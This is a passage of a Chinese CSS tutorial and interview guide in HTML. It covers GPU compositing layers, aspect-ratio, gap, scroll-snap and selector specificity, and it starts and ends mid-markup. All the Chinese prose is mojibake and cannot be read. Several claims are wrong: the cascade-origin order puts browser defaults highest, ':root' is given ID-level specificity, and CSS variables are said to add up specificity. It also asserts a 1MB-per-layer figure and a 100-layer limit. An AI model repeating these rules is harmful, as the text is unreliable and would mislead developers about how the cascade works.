align="left">â˜…â˜…â˜…â˜†â˜†</td></tr><tr><td align="left">perspective: 1000px</td><td align="left">åˆ›å»º3Dä¸Šä¸‹æ–‡</td><td align="left">â˜…â˜…â˜…â˜…â˜†</td></tr></tbody></table><p><strong>ä¼˜åŒ–åŸç†</strong></p><ul><li>å°†å…ƒç´ æå‡åˆ°ç‹¬ç«‹å¤åˆå±‚</li><li>é¿å…ä¸ä¸»çº¿ç¨‹çš„å¸ƒå±€è®¡ç®—ç›¸äº’é˜»å¡</li></ul><p><strong>æµè§ˆå™¨æ¸²æŸ“ç®¡çº¿åˆ†æ</strong></p><pre class="mermaid">graph TD    A[Style Recalc] --> B[Layout]    B --> C[Paint]    C --> D[Composite]    D -->|GPUåŠ é€Ÿ| E[Layer Drawing]</pre><p>å…³é”®é˜¶æ®µï¼š</p><ul><li>Compositeï¼šæµè§ˆå™¨å†³å®šå“ªäº›å…ƒç´ éœ€è¦ç‹¬ç«‹å›¾å±‚</li><li>Layer Drawingï¼šGPUå®é™…æ¸²æŸ“å›¾å±‚</li></ul><p><strong>å±‚åˆ›å»ºè§„åˆ™</strong></p><p>ï¼ˆ1ï¼‰æ˜¾å¼è§¦å‘æ¡ä»¶</p><ul><li>3D æˆ–é€è§†å˜æ¢ï¼ˆperspectiveã€transform3dï¼‰</li><li>è§†é¢‘&#x2F;canvas&#x2F;webGL ç­‰åµŒå…¥å¼å†…å®¹</li><li>å¯¹ opacity&#x2F;transform ç­‰åš CSS åŠ¨ç”»</li><li>å…·æœ‰ filter æˆ– mask å±æ€§çš„å…ƒç´ </li></ul><p>ï¼ˆ2ï¼‰éšå¼è§¦å‘æ¡ä»¶</p><ul><li>é‡å å…ƒç´ ï¼ˆz-index è¾ƒé«˜å¯èƒ½è¢«æå‡ï¼‰</li><li>æ»šåŠ¨å®¹å™¨å†…çš„å›ºå®šä½ç½®å…ƒç´ </li><li>ä½¿ç”¨ position:fixed çš„å…ƒç´ </li></ul><p><strong>æ³¨æ„äº‹é¡¹</strong></p><ul><li>å†…å­˜æ¶ˆè€—ï¼šæ¯ä¸ªå¤åˆå±‚çº¦å ç”¨ 1MB å†…å­˜</li><li>å±‚çˆ†ç‚¸ï¼šé¿å…è¶…è¿‡ 100 ä¸ªå¤åˆå±‚ï¼ˆchromium é™åˆ¶ï¼‰</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* é”™è¯¯ï¼šè¿‡åº¦åˆ›å»ºå¤åˆå±‚ */</span><br><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0.5</span>);<br>&#125;<br><br><span class="hljs-comment">/* æ­£ç¡®ï¼šåˆå¹¶ä¼˜åŒ– */</span><br><span class="hljs-selector-class">.optimized-card</span> &#123;<br>  <span class="hljs-attribute">will-change</span>: transform, box-shadow;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç»„åˆä¼˜åŒ–æ–¹æ¡ˆ"><a href="#ç»„åˆä¼˜åŒ–æ–¹æ¡ˆ" class="headerlink" title="ç»„åˆä¼˜åŒ–æ–¹æ¡ˆ"></a>ç»„åˆä¼˜åŒ–æ–¹æ¡ˆ</h3><p>ï¼ˆ1ï¼‰è™šæ‹Ÿåˆ—è¡¨ä¼˜åŒ–</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.list-item</span> &#123;<br>  <span class="hljs-attribute">contain</span>: strict;<br>  <span class="hljs-attribute">will-change</span>: transform;<br>  <span class="hljs-attribute">position</span>: absolute;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateY</span>(<span class="hljs-built_in">var</span>(--pos));<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ2ï¼‰é«˜æ€§èƒ½åŠ¨ç”»ä¸‰ä»¶å¥—</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.smooth-animation</span> &#123;<br>  <span class="hljs-attribute">transform</span>: <span class="hljs-built_in">translateZ</span>(<span class="hljs-number">0</span>);<br>  <span class="hljs-attribute">will-change</span>: transform;<br>  <span class="hljs-attribute">contain</span>: strict;<br>  <span class="hljs-comment">/* åªä½¿ç”¨opacity/transformå˜åŒ– */</span><br>  <span class="hljs-attribute">transition</span>: transform <span class="hljs-number">0.3s</span> <span class="hljs-built_in">cubic-bezier</span>(<span class="hljs-number">0.2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.1</span>, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆ3ï¼‰è°·æ­ŒChromeå›¢é˜Ÿå»ºè®®</p><ul><li>å¯¹position: fixedå…ƒç´ å§‹ç»ˆä½¿ç”¨will-change: transform</li><li>æ»šåŠ¨å®¹å™¨è®¾ç½®overflow: autoè€Œéscrollï¼ˆé¿å…å¸¸é©»å±‚ï¼‰</li></ul><h2 id="4-5-ç°ä»£-CSS-ç‰¹æ€§ï¼ˆaspect-ratioã€gapã€scroll-snapï¼‰"><a href="#4-5-ç°ä»£-CSS-ç‰¹æ€§ï¼ˆaspect-ratioã€gapã€scroll-snapï¼‰" class="headerlink" title="4.5 ç°ä»£ CSS ç‰¹æ€§ï¼ˆaspect-ratioã€gapã€scroll-snapï¼‰"></a>4.5 ç°ä»£ CSS ç‰¹æ€§ï¼ˆaspect-ratioã€gapã€scroll-snapï¼‰</h2><h3 id="aspect-ratioï¼šå®ç°å…ƒç´ å®½é«˜æ¯”çš„ç»ˆæè§£å†³æ–¹æ¡ˆ"><a href="#aspect-ratioï¼šå®ç°å…ƒç´ å®½é«˜æ¯”çš„ç»ˆæè§£å†³æ–¹æ¡ˆ" class="headerlink" title="aspect-ratioï¼šå®ç°å…ƒç´ å®½é«˜æ¯”çš„ç»ˆæè§£å†³æ–¹æ¡ˆ"></a>aspect-ratioï¼šå®ç°å…ƒç´ å®½é«˜æ¯”çš„ç»ˆæè§£å†³æ–¹æ¡ˆ</h3><p><strong>åŸºç¡€ç”¨æ³•</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.media-box</span> &#123;<br>  <span class="hljs-attribute">aspect-ratio</span>: <span class="hljs-number">16</span>/<span class="hljs-number">9</span>; <span class="hljs-comment">/* å®½åº¦:é«˜åº¦=16:9 */</span><br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>; <span class="hljs-comment">/* å®½åº¦ä¼˜å…ˆï¼Œé«˜åº¦è‡ªåŠ¨è®¡ç®— */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è®¡ç®—è§„åˆ™</strong></p><p>é«˜åº¦ &#x3D; å®½åº¦ x ï¼ˆåˆ†æ¯&#x2F;åˆ†å­ï¼‰</p><p><strong>ç‰¹æ®Šåœºæ™¯å¤„ç†</strong></p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">è§£å†³æ–¹æ¡ˆ</th></tr></thead><tbody><tr><td align="left">åŒæ—¶è®¾ç½®å®½é«˜</td><td align="left">aspect-ratioä¼šè¦†ç›–height</td></tr><tr><td align="left">æœ€å°&#x2F;æœ€å¤§é«˜åº¦é™åˆ¶</td><td align="left">ä½¿ç”¨min-height&#x2F;max-height</td></tr><tr><td align="left">æ›¿æ¢å…ƒç´ (å¦‚img)</td><td align="left">ä¼˜å…ˆä½¿ç”¨å…ƒç´ åŸç”Ÿå®½é«˜æ¯”</td></tr></tbody></table><h3 id="gapï¼šå–ä»£-margin-çš„æ™ºèƒ½é—´è·ç³»ç»Ÿ"><a href="#gapï¼šå–ä»£-margin-çš„æ™ºèƒ½é—´è·ç³»ç»Ÿ" class="headerlink" title="gapï¼šå–ä»£ margin çš„æ™ºèƒ½é—´è·ç³»ç»Ÿ"></a>gapï¼šå–ä»£ margin çš„æ™ºèƒ½é—´è·ç³»ç»Ÿ</h3><p><strong>å¤šå¸ƒå±€é€šç”¨è¯­æ³•</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.grid-layout</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>; <span class="hljs-comment">/* è¡Œåˆ—é—´è·ç»Ÿä¸€ */</span><br>&#125;<br><br><span class="hljs-selector-class">.flex-layout</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span> <span class="hljs-number">15px</span>; <span class="hljs-comment">/* è¡Œé—´è· åˆ—é—´è· */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æµè§ˆå™¨å…¼å®¹ç­–ç•¥</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.grid</span> &#123;<br>  <span class="hljs-comment">/* æ—§ç‰ˆGridæ”¯æŒ */</span><br>  <span class="hljs-attribute">grid-gap</span>: <span class="hljs-number">20px</span>;<br>  <span class="hljs-comment">/* æ ‡å‡†å†™æ³• */</span><br>  <span class="hljs-attribute">gap</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="scroll-snapï¼šç²¾å‡†æ§åˆ¶æ»šåŠ¨"><a href="#scroll-snapï¼šç²¾å‡†æ§åˆ¶æ»šåŠ¨" class="headerlink" title="scroll-snapï¼šç²¾å‡†æ§åˆ¶æ»šåŠ¨"></a>scroll-snapï¼šç²¾å‡†æ§åˆ¶æ»šåŠ¨</h3><p><strong>å®Œæ•´å±æ€§ä½“ç³»</strong></p><table><thead><tr><th align="left">å±æ€§</th><th align="left">ä½œç”¨</th><th align="left">ç¤ºä¾‹å€¼</th></tr></thead><tbody><tr><td align="left">scroll-snap-type</td><td align="left">å®¹å™¨æ»šåŠ¨æ•æ‰ç±»å‹</td><td align="left">x mandatory</td></tr><tr><td align="left">scroll-snap-align</td><td align="left">å­é¡¹å¯¹é½ä½ç½®</td><td align="left">start center end</td></tr><tr><td align="left">scroll-snap-stop</td><td align="left">æ˜¯å¦å¼ºåˆ¶åœç•™</td><td align="left">normal always</td></tr><tr><td align="left">scroll-padding</td><td align="left">æ»šåŠ¨è§†çª—å†…è¾¹è·</td><td align="left">20px</td></tr></tbody></table><p><strong>æ¨ªå‘è½®æ’­å›¾å®ç°</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div class=&quot;carousel&quot;&gt;<br>  &lt;div class=&quot;slide&quot;&gt;1&lt;/div&gt;<br>  &lt;div class=&quot;slide&quot;&gt;2&lt;/div&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.carousel</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>  <span class="hljs-attribute">overflow-x</span>: auto;<br>  <span class="hljs-attribute">scroll-snap-type</span>: x mandatory;<br>  <span class="hljs-attribute">scroll-padding</span>: <span class="hljs-number">20px</span>; <span class="hljs-comment">/* é¿å…å†…å®¹è¢«é®æŒ¡ */</span><br>&#125;<br><br><span class="hljs-selector-class">.slide</span> &#123;<br>  <span class="hljs-attribute">scroll-snap-align</span>: start;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">80vw</span>; <span class="hljs-comment">/* æ¯å±æ˜¾ç¤ºä¸€ä¸ª */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="æµè§ˆå™¨æ”¯æŒä¸é™çº§æ–¹æ¡ˆ"><a href="#æµè§ˆå™¨æ”¯æŒä¸é™çº§æ–¹æ¡ˆ" class="headerlink" title="æµè§ˆå™¨æ”¯æŒä¸é™çº§æ–¹æ¡ˆ"></a>æµè§ˆå™¨æ”¯æŒä¸é™çº§æ–¹æ¡ˆ</h3><p><strong>ç‰¹æ€§æ£€æµ‹ç­–ç•¥</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs CSS">// æ£€æµ‹<span class="hljs-attribute">aspect-ratio</span>æ”¯æŒ<br>const supportsAspectRatio = CSS<span class="hljs-selector-class">.supports</span>(&#x27;<span class="hljs-attribute">aspect-ratio</span>: <span class="hljs-number">1</span>/<span class="hljs-number">1</span><span class="hljs-string">&#x27;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">// æ£€æµ‹gapæ”¯æŒï¼ˆFlexboxç‰ˆæœ¬ï¼‰</span><br><span class="hljs-string">const supportsFlexGap = CSS.supports(&#x27;</span>gap: <span class="hljs-number">10px</span><span class="hljs-string">&#x27;, &#x27;</span>display: flex<span class="hljs-string">&#x27;);</span><br></code></pre></td></tr></table></figure><p><strong>æ¸è¿›å¢å¼ºå†™æ³•</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-comment">/* æ—§ç‰ˆFlexå¸ƒå±€é—´è· */</span><br>  <span class="hljs-attribute">margin</span>: -<span class="hljs-number">5px</span>;<br>&#125;<br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">5px</span>;<br>&#125;<br><br><span class="hljs-keyword">@supports</span> (<span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-selector-class">.item</span> &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç¬¬äº”ç« ï¼šCSS-å·¥ç¨‹åŒ–ä¸æ¶æ„"><a href="#ç¬¬äº”ç« ï¼šCSS-å·¥ç¨‹åŒ–ä¸æ¶æ„" class="headerlink" title="ç¬¬äº”ç« ï¼šCSS å·¥ç¨‹åŒ–ä¸æ¶æ„"></a>ç¬¬äº”ç« ï¼šCSS å·¥ç¨‹åŒ–ä¸æ¶æ„</h1><h2 id="5-1-CSS-é¢„å¤„ç†ï¼ˆSass-Less-å˜é‡ã€åµŒå¥—ã€Mixinï¼‰"><a href="#5-1-CSS-é¢„å¤„ç†ï¼ˆSass-Less-å˜é‡ã€åµŒå¥—ã€Mixinï¼‰" class="headerlink" title="5.1 CSS é¢„å¤„ç†ï¼ˆSass&#x2F;Less å˜é‡ã€åµŒå¥—ã€Mixinï¼‰"></a>5.1 CSS é¢„å¤„ç†ï¼ˆSass&#x2F;Less å˜é‡ã€åµŒå¥—ã€Mixinï¼‰</h2><h2 id="5-2-CSS-æ¨¡å—åŒ–ï¼ˆBEMã€CSS-Modulesã€CSS-in-JSï¼‰"><a href="#5-2-CSS-æ¨¡å—åŒ–ï¼ˆBEMã€CSS-Modulesã€CSS-in-JSï¼‰" class="headerlink" title="5.2 CSS æ¨¡å—åŒ–ï¼ˆBEMã€CSS Modulesã€CSS-in-JSï¼‰"></a>5.2 CSS æ¨¡å—åŒ–ï¼ˆBEMã€CSS Modulesã€CSS-in-JSï¼‰</h2><h2 id="5-3-PostCSS-ä¸-Autoprefixer"><a href="#5-3-PostCSS-ä¸-Autoprefixer" class="headerlink" title="5.3 PostCSS ä¸ Autoprefixer"></a>5.3 PostCSS ä¸ Autoprefixer</h2><h2 id="5-4-åŸå­åŒ–-CSSï¼ˆTailwind-CSSã€UnoCSSï¼‰"><a href="#5-4-åŸå­åŒ–-CSSï¼ˆTailwind-CSSã€UnoCSSï¼‰" class="headerlink" title="5.4 åŸå­åŒ– CSSï¼ˆTailwind CSSã€UnoCSSï¼‰"></a>5.4 åŸå­åŒ– CSSï¼ˆTailwind CSSã€UnoCSSï¼‰</h2><h2 id="5-5-è®¾è®¡ç³»ç»Ÿä¸-CSS-æ¶æ„ï¼ˆä¸»é¢˜åˆ‡æ¢ã€å˜é‡ç®¡ç†ï¼‰"><a href="#5-5-è®¾è®¡ç³»ç»Ÿä¸-CSS-æ¶æ„ï¼ˆä¸»é¢˜åˆ‡æ¢ã€å˜é‡ç®¡ç†ï¼‰" class="headerlink" title="5.5 è®¾è®¡ç³»ç»Ÿä¸ CSS æ¶æ„ï¼ˆä¸»é¢˜åˆ‡æ¢ã€å˜é‡ç®¡ç†ï¼‰"></a>5.5 è®¾è®¡ç³»ç»Ÿä¸ CSS æ¶æ„ï¼ˆä¸»é¢˜åˆ‡æ¢ã€å˜é‡ç®¡ç†ï¼‰</h2><h1 id="ç¬¬å…­ç« ï¼šCSS-é¢è¯•é«˜é¢‘è€ƒç‚¹"><a href="#ç¬¬å…­ç« ï¼šCSS-é¢è¯•é«˜é¢‘è€ƒç‚¹" class="headerlink" title="ç¬¬å…­ç« ï¼šCSS é¢è¯•é«˜é¢‘è€ƒç‚¹"></a>ç¬¬å…­ç« ï¼šCSS é¢è¯•é«˜é¢‘è€ƒç‚¹</h1><h2 id="6-1-CSS-ä¼˜å…ˆçº§ä¸æƒé‡æ·±åº¦è€ƒå¯Ÿ"><a href="#6-1-CSS-ä¼˜å…ˆçº§ä¸æƒé‡æ·±åº¦è€ƒå¯Ÿ" class="headerlink" title="6.1 CSS ä¼˜å…ˆçº§ä¸æƒé‡æ·±åº¦è€ƒå¯Ÿ"></a>6.1 CSS ä¼˜å…ˆçº§ä¸æƒé‡æ·±åº¦è€ƒå¯Ÿ</h2><h3 id="åŸºç¡€æ¦‚å¿µè€ƒå¯Ÿ"><a href="#åŸºç¡€æ¦‚å¿µè€ƒå¯Ÿ" class="headerlink" title="åŸºç¡€æ¦‚å¿µè€ƒå¯Ÿ"></a>åŸºç¡€æ¦‚å¿µè€ƒå¯Ÿ</h3><p><strong>Qï¼šè¯·è§£é‡Š CSS é€‰æ‹©å™¨çš„æƒé‡è®¡ç®—è§„åˆ™ï¼Ÿ</strong></p><p>æƒé‡ç”±å››ä¸ªåˆ†é‡ç»„æˆï¼ŒæŒ‰ (a, b, c, d) è®¡ç®—ï¼š</p><ul><li>aï¼š!importantï¼ˆéé€‰æ‹©å™¨ï¼Œå•ç‹¬æ ‡è®°ï¼‰</li><li>bï¼šIDé€‰æ‹©å™¨æ•°é‡ï¼ˆå¦‚ #headerï¼‰</li><li>cï¼šç±»&#x2F;ä¼ªç±»&#x2F;å±æ€§é€‰æ‹©å™¨æ•°é‡ï¼ˆå¦‚ .class, :hover, [type&#x3D;â€textâ€]ï¼‰</li><li>dï¼šå…ƒç´ &#x2F;ä¼ªå…ƒç´ é€‰æ‹©å™¨æ•°é‡ï¼ˆå¦‚ div, ::beforeï¼‰</li></ul><p>ç¤ºä¾‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-id">#nav</span> <span class="hljs-selector-class">.item</span><span class="hljs-selector-pseudo">:hover</span><span class="hljs-selector-pseudo">::before</span> &#123;&#125; <span class="hljs-comment">/* æƒé‡ï¼š0,1,2,1 */</span><br></code></pre></td></tr></table></figure><p>é™·é˜±ï¼š<code>!important</code> çš„æƒé‡çœŸçš„æœ€é«˜å—ï¼Ÿ</p><ul><li>å½“å¤šä¸ª !important å†²çªæ—¶ï¼Œä»éœ€æŒ‰é€‰æ‹©å™¨æƒé‡æ¯”è¾ƒ</li><li>!important ä¼šç ´åæ ·å¼å±‚å ï¼Œåº”å°½é‡é¿å…</li></ul><h3 id="æƒé‡å®æˆ˜è€ƒå¯Ÿ"><a href="#æƒé‡å®æˆ˜è€ƒå¯Ÿ" class="headerlink" title="æƒé‡å®æˆ˜è€ƒå¯Ÿ"></a>æƒé‡å®æˆ˜è€ƒå¯Ÿ</h3><p><strong>Qï¼šåˆ¤æ–­ä»¥ä¸‹æ ·å¼çš„æœ€ç»ˆç”Ÿæ•ˆé¢œè‰²ï¼Ÿ</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;div id=&quot;box&quot; class=&quot;container warning&quot; style=&quot;color: yellow&quot;&gt;Text&lt;/div&gt;<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-id">#box</span> &#123; <span class="hljs-attribute">color</span>: red; &#125;            <span class="hljs-comment">/* A */</span><br><span class="hljs-selector-class">.container</span> &#123; <span class="hljs-attribute">color</span>: blue; &#125;     <span class="hljs-comment">/* B */</span><br><span class="hljs-selector-tag">div</span><span class="hljs-selector-class">.warning</span> &#123; <span class="hljs-attribute">color</span>: green; &#125;   <span class="hljs-comment">/* C */</span><br><span class="hljs-selector-tag">div</span> &#123; <span class="hljs-attribute">color</span>: orange <span class="hljs-meta">!important</span>; &#125; <span class="hljs-comment">/* D */</span><br></code></pre></td></tr></table></figure><p>åˆ†æè¿‡ç¨‹ï¼š</p><ul><li>ABCD å’Œè¡Œå†…æ ·å¼çš„æƒé‡åˆ†åˆ«ä¸ºï¼š<ul><li>Aï¼š0,1,0,0</li><li>Bï¼š0,0,1,0</li><li>Cï¼š0,0,1,1</li><li>Dï¼š1,0,0,1</li><li>è¡Œå†…æ ·å¼ï¼š1,0,0,0</li></ul></li><li>å¯¹æ¯”å„æƒé‡ï¼šD çš„æƒé‡æœ€é«˜ -&gt; æœ€ç»ˆ orange é¢œè‰²ç”Ÿæ•ˆ</li></ul><h3 id="å±‚å è§„åˆ™é«˜é˜¶é—®é¢˜"><a href="#å±‚å è§„åˆ™é«˜é˜¶é—®é¢˜" class="headerlink" title="å±‚å è§„åˆ™é«˜é˜¶é—®é¢˜"></a>å±‚å è§„åˆ™é«˜é˜¶é—®é¢˜</h3><p><strong>Qï¼šåœ¨ç›¸åŒæƒé‡ä¸‹ï¼Œæ ·å¼å¦‚ä½•å†³å®šä¼˜å…ˆçº§ï¼Ÿ</strong></p><p>å®Œæ•´å±‚å é¡ºåº</p><ul><li><code>!important</code> å£°æ˜</li><li>æ¥æºä¼˜å…ˆçº§ï¼ˆä»é«˜åˆ°ä½ï¼‰ï¼š<ul><li>ç”¨æˆ·ä»£ç†æ ·å¼ï¼ˆæµè§ˆå™¨é»˜è®¤ï¼‰</li><li>ç”¨æˆ·æ ·å¼è¡¨</li><li>å¼€å‘è€…æ ·å¼è¡¨</li><li>å¼€å‘è€… <code>!important</code></li><li>ç”¨æˆ· <code>!important</code></li></ul></li><li>é€‰æ‹©å™¨æƒé‡</li><li>ä»£ç é¡ºåºï¼ˆåå®šä¹‰çš„è¦†ç›–å…ˆå®šä¹‰ï¼‰</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* æ ·å¼è¡¨A */</span><br><span class="hljs-selector-pseudo">:root</span> &#123; <span class="hljs-attr">--color</span>: red; &#125;<br><span class="hljs-selector-class">.box</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--color); &#125;<br><br><span class="hljs-comment">/* æ ·å¼è¡¨Bï¼ˆååŠ è½½ï¼‰ */</span><br><span class="hljs-selector-pseudo">:root</span> &#123; <span class="hljs-attr">--color</span>: blue; &#125;<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆé¢œè‰²ä¸º blueï¼ˆå˜é‡éµå¾ªä»£ç é¡ºåºï¼‰</p><h3 id="CSS-å˜é‡ä¸æƒé‡è€ƒå¯Ÿ"><a href="#CSS-å˜é‡ä¸æƒé‡è€ƒå¯Ÿ" class="headerlink" title="CSS å˜é‡ä¸æƒé‡è€ƒå¯Ÿ"></a>CSS å˜é‡ä¸æƒé‡è€ƒå¯Ÿ</h3><p><strong>Qï¼šCSSè‡ªå®šä¹‰å±æ€§çš„æƒé‡å¦‚ä½•è®¡ç®—ï¼Ÿ</strong></p><p>å…³é”®è§„åˆ™ï¼š</p><ul><li>å˜é‡æœ¬èº«æ²¡æœ‰æƒé‡ï¼Œç»§æ‰¿æ‰€åœ¨è§„åˆ™çš„æƒé‡</li><li>ä½¿ç”¨ var() æ—¶ï¼Œæœ€ç»ˆå€¼æƒé‡&#x3D;å˜é‡å£°æ˜æƒé‡ + ä½¿ç”¨å¤„é€‰æ‹©å™¨æƒé‡</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-pseudo">:root</span> &#123; <span class="hljs-attr">--text-color</span>: red; &#125; <span class="hljs-comment">/* æƒé‡ï¼š0,1,0,0 */</span><br><span class="hljs-selector-id">#box</span> &#123; <span class="hljs-attr">--text-color</span>: blue; &#125; <span class="hljs-comment">/* æƒé‡ï¼š0,1,0,0 */</span><br><span class="hljs-selector-tag">p</span> &#123; <span class="hljs-attribute">color</span>: <span class="hljs-built_in">var</span>(--text-color); &#125; <span class="hljs-comment">/* ç»§æ‰¿å˜é‡å£°æ˜å¤„çš„æƒé‡ */</span><br></code></pre></td></tr></table></figure><p>æ­¤æ—¶ <code>&lt;div id=&quot;box&quot;&gt;&lt;p&gt;Text&lt;/p&gt;&lt;/div&gt;</code> æ˜¾ç¤ºè“è‰²ï¼ˆç›¸åŒæƒé‡ä¸‹åå®šä¹‰ç”Ÿæ•ˆï¼‰</p><h2 id="6-2-å±…ä¸­å¸ƒå±€çš„-N-ç§æ–¹å¼"><a href="#6-2-å±…ä¸­å¸ƒå±€çš„-N-ç§æ–¹å¼" class="headerlink" title="6.2 å±…ä¸­å¸ƒå±€çš„ N ç§æ–¹å¼"></a>6.2 å±…ä¸­å¸ƒå±€çš„ N ç§æ–¹å¼</h2><h3 id="æ°´å¹³å±…ä¸­"><a href="#æ°´å¹³å±…ä¸­" class="headerlink" title="æ°´å¹³å±…ä¸­"></a>æ°´å¹³å±…ä¸­</h3><p><strong>è¡Œå†…&#x2F;è¡Œå†…å—å…ƒç´ </strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.parent</span> &#123;<br>  <span class="hljs-attribute">text-align</span>: center; <span class="hljs-comment">/* ä¼ ç»Ÿæ–¹æ¡ˆ */</span><br>&#125;<br><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">display</span>: inline-block;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å—çº§å…ƒç´ ï¼ˆå›ºå®šå®½åº¦ï¼‰</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-selector-class">.child</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;<br>  <span class="hljs-attribute">margin</span>: <span 